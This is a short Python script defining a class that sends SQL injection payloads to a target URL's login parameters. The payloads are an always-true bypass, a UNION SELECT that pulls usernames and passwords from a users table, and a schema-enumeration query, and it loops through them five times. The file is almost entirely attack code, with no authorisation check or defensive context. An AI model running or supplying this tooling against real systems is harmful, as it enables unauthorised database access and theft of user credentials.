import requests
import random
import string

class SQLInjection:
    def __init__(self, target_url):
        self.target_url = target_url

    def generate_payload(self):
        """
        Generate advanced SQL injection payloads.
        """
        payloads = [
            "' OR '1'='1'; --",
            "' UNION SELECT null, username, password FROM users --",
            "' AND 1=0 UNION SELECT null, table_name, column_name FROM information_schema.columns --"
        ]
        return random.choice(payloads)

    def test_injection(self, payload):
        """
        Test SQL injection payload on the target.
        """
        try:
            response = requests.get(self.target_url, params={'username': payload, 'password': 'any'})
            if "error" in response.text or "syntax" in response.text:
                print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
            else:
                print(f"Payload {payload} executed successfully.")
        except requests.exceptions.RequestException as e:
            print(f"Error testing payload: {e}")

    def run_sql_injection(self):
        """
        Run multiple SQL injection tests on the target.
        """
        for _ in range(5):
            payload = self.generate_payload()
            self.test_injection(payload)
